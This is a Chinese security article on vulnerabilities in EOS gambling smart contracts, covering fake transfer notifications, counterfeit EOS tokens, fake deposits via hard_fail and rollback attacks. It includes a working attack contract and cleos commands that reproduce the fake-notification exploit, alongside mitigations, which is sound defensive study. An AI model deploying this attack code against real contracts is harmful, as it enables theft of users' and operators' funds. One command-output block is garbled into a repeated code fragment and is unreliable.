**作者：天宸@蚂蚁安全实验室  
原文链接：**
### 引言
EOS
在诞生之初的新闻报道里，被视为区块链3.0的代表。EOS的交易处理速度据称能够达到每秒百万量级，与其相比，以太坊每秒20多笔，比特币每秒7笔的处理速度实在是捉襟见肘。
据 2018 年10月 DappRadar 数据显示，排名前10的 EOS DAPP 中有6个属于博彩游戏，在所有的 EOS Dapp
中，博彩类游戏24小时交易量占比达到 84% 以上。EOS 玩家戏称博彩应用为菠菜应用。
2021 年 4 月，我们又统计了 Dappradar 列出的前 572 个 EOS Dapp，其中菠菜类应用
308个，占比超过总数的一半。时至今日菠菜应用仍然占据 EOS 的半壁江山，我们姑且称此篇系列文章为：菠菜应用篇。
![
](https://images.seebug.org/content/images/2021/05/42d3a61c-b9ba-4490-8e2b-61b6bdce008c.png-w331s)
EOS 公链上线初期，菠菜类应用火爆吸引了大量资金，但是项目合约代码安全性薄弱，成为攻击的重灾区。据安全厂商统计，EOS 上线第一年共发生超 60
起典型攻击事件，1-4 月为集中爆发期，占全年攻击事件的 67%，主要原因为 EOS 公链上菠菜类应用的持续火爆，加之项目合约代码安全性薄弱，导致黑客在多个
DApp 上就同一个漏洞进行连续攻击，手法主要以交易阻塞、回滚交易攻击，假 EOS 攻击，随机数破解等。本文对每一种攻击手段都做了复现。
此外，本文系统的梳理了其他类型的漏洞，并按照相关度的高低排列顺序，方便读者感受到漏洞之间的递进关系。
### 背景介绍
#### 什么是 EOS
EOS全称叫做“Enterprise Operation
System”，中文翻译是“企业操作系统”，是为企业级分布式应用设计的一款区块链操作系统。相比于比特币、以太坊平台性能低、开发难度大以及手续费高等问题，EOS拥有高性能处理能力、易于开发以及用户免费等优势，能极大的满足企业级的应用需求，诞生之初曾被誉为继比特币、以太坊之后区块链
3.0 技术。
为什么EOS性能高？这要得益于他的共识算法的设计。想知道他的共识算法？欢迎关注后续文章。
#### EOS 上的智能合约有什么特点
EOSIO智能合约由一组 Action 和类型定义组成。Action 指定并实现合约的行为。类型定义指定所需的内容和结构。开发合约时要对每一个action
实现对应的 action handler。action handler 的参数指定了接收的参数类型和数量。当向此合约发送 action
时，要发送满足要求的参数。
##### Action
EOSIO Action 主要在基于消息的通信体系结构中运行。客户端可以使用 cleos 命令，将消息发送（推送）到 nodeos 来调用
Action。也可以使用 EOSIO send 方法（例如eosio :: action :: send）来调用 Action。nodeos 将
Action 请求分发给合约的 WASM 代码。该代码完整地运行完，然后继续处理下一个 Action。
##### 通信模型
EOS体系是以通讯为基本的，Action 就是EOS上通讯的载体。EOSIO 支持两种基本通信模型：内联（inline）通信，如在当前交易中处理
Action，和延迟（defer）通信，如触发一笔将来的交易。
  * Inline通信
Inline 通信是指调用 Action 和被调用 Action 都要执行成功（否则会一起回滚）。(Inline communication takes
the form of requesting other actions that need to be executed as part of the
calling action.) Inline 通信使用原始交易相同的 scope 和权限作为执行上下文，并保证与当前 action 一起执行。可以被认为是
transaction 中的嵌套 transaction。如果 transaction 的任何部分失败，Inline 动作将和其他 transaction
一起回滚。无论成功或失败，Inline 都不会在 transaction 范围外生成任何通知。
  * Deferred通信
Deferred 通信在概念上等同于发送一个 transaction 给一个账户。这个 transaction 的执行是 eos
出快节点自主判断进行的，Deferrd 通信无法保证消息一定成功或者失败。
如前所述，Deferred 通信将在稍后由出快节点自行决定，从原始 transaction（即创建 Deferred 通信的
transaction）的角度来看，它只能确定创建请求是成功提交还是失败（如果失败，transaction 将立即失败）。
拥有这些背景知识，在理解下文的漏洞时会更加明了。
### EOS 特性导致的漏洞类型
#### 假 transfer 通知
##### 漏洞介绍
EOS 的合约可以通过 require_recipient(someone) 给其他合约发送转账通知。在其他合约的 transfer
中没有校验接受者是否为自己。来看一个真实的案例：
![
](https://images.seebug.org/content/images/2021/05/348748f3-2e72-4403-8140-eb264d1453b2.png-w331s)
图片来自慢雾科技
本次攻击中黑客创建了两个账户：攻击账户 ilovedice123 和攻击合约 whoiswinner1。游戏合约在 apply 里没有校验 transfer
action 的调用方必须是 eosio.token 或者是自己的游戏代币合约。攻击账户 ilovedice123 向攻击合约 whoiswinner1
转账后，EOSBet 合约的 transfer 函数被成功调用，误将攻击账户 ilovedice123 当成下注玩家，被套走了 142,845 个 EOS。
##### 漏洞示例
    void eosbocai2222::transfer(const name &from,
                                const name &to,
                                const asset &quantity,
                                const string &memo)
    {
        eostime playDiceStartat = 1540904400; //2018-10-30 21:00:00
        if ("buy token" == memo)
        {
            eosio_assert(playDiceStartat > now(), "Time is up");
            buytoken(from, quantity);
            return;
        }
transfer 函数没有校验 to!=_self
##### 攻击示例
攻击代码
    #include 
      #include 
      using namespace eosio;
      using namespace std;
      class [[eosio::contract]] attack : public contract {
        public:
            using contract::contract;
            [[eosio::action]]
            void transfer( name from ,name to, asset quantity, string memo ) {
               require_recipient(name("eosdiceadmin"));
            }
      };
      extern "C" {
          void apply(uint64_t receiver, uint64_t code, uint64_t action) {
              if ((code == name("eosio.token").value) && (action == name("transfer").value)) {
              // if (action == name("transfer").value){
                  execute_action(name(receiver),name(code), &attack::transfer);
                  return;
              }
          }
      }
核心代码：require_recipient(name("eosdiceadmin"));
攻击前查看余额
    Adas-Macbook-Pro:eosbocai2222 ada$ cleos get currency balance eosio.token ada
    410.0000 ADA
    1013.1741 BOB
    1000020.0000 SYS
    Adas-Macbook-Pro:eosbocai2222 ada$ cleos get currency balance eosio.token bob
    899999998089.1271 BOB
    15.0000 SYS
ada 拥有 1013.1741 BOB 币
bob 拥有 899999998089.1271 BOB 币
发起假转账通知攻击
    Adas-Macbook-Pro:eosbocai2222 ada$ cleos push action eosio.token transfer '["bob", "ada", "1.0000 BOB", "dice-50-eosdiceadmin"]' -p bob
    executed transaction: c4bc13c4d911354e4dab43d3b06bba4a1cdd33b576062fdf6d9189a6066d3c51  152 bytes  1527 us
    #   eosio.token  now(), "Time is up");
            buytoken(from, quantity);
            return;
        }
#### 假 EOS 代币
##### 漏洞介绍
Apply 函数中没有校验 EOS 的发行者是否是真正的发行者 eosio.token ，导致攻击者可以发行同名的
EOS，进而触发被攻击合约的transfer函数，无成本获得真正的EOS。
##### 漏洞示例
    extern "C" { 
       void apply( uint64_t receiver, uint64_t code, uint64_t action ) { 
           if ((code == receiver ) || (action == name("transfer").value))
            {       
                code = name("eosdiceadmin").value;
                switch (action)
                {
                    EOSIO_DISPATCH_HELPER(eosbocai2222, (reveal)(init)(transfer))
                };
            }
       }    
    }
代码中没有校验 EOS 的发行者。
##### 攻击示例
创建一个假 EOS 币，向 eosdiceadmin 转账即可。
##### 规避建议
    extern "C"
    {
        void apply(uint64_t receiver, uint64_t code, uint64_t action)
    {
            if ((code == name("eosio.token").value) && (action == name("transfer").value))
            {
                execute_action(name(receiver),name("eosdiceadmin"), &eosbocai2222::transfer);
                return;
            }
            if (code != receiver)
                return;
            switch (action)
            {
                EOSIO_DISPATCH_HELPER(eosbocai2222, (reveal)(init))
            };
        }
    }
校验真正的发行者的身份 code == name("eosio.token").value
#### 假充值漏洞
假充值漏洞不仅在以太坊平台上存在，EOS 也存在。并且 EOS 上的攻击方式更多样化。
##### 漏洞介绍
此漏洞是因为项目方没有对交易的 status 状态进行校验，只是对交易是否存在作出了判断。但是交易可能执行失败，交易状态变成
hard_fail。hard_fail 的交易也可以在链上出现记录。所以，把交易是否存在作为充值成功的依据是不正确的。
##### 漏洞示例
EOS 游戏 Vegas Town (合约帐号 eosvegasgame)遭受攻击，损失数千 EOS。此攻击的一个最主要的点有两个，一个是
hard_fail，第二个是交易延迟导致 hard_fail。
hard_fail 是指：客观的错误并且错误处理器没有正确执行。简单来说就是出现错误但是没有使用错误处理器(error handler)处理错误，比方说使用
onerror 捕获处理，如果说没有 onerror 捕获，就会 hard_fail。
##### 攻击示例
只要对 cleos 中的一个参数设置就可以对交易进行延迟。但是这种交易不同于我们合约发出的
eosio_assert，没有错误处理。根据官方文档的描述，自然会变成 hard_fail。而且最关键的一个点是，hard_fail
会在链上出现记录，能通过项目方的校验。攻击者就无成本的充值成功了。
##### 规避建议
不要只是判断交易是否存在，还要判断下注交易是否成功执行。
### 回滚漏洞
回滚攻击常用于猜测彩票合约结果，攻击者先投注，然后监测开奖结果，如果不能中奖就回滚。反之则投注。攻击者不损失任何 EOS，从而达到稳赢的结果。回滚攻击在
EOS 上真实的发生过多次。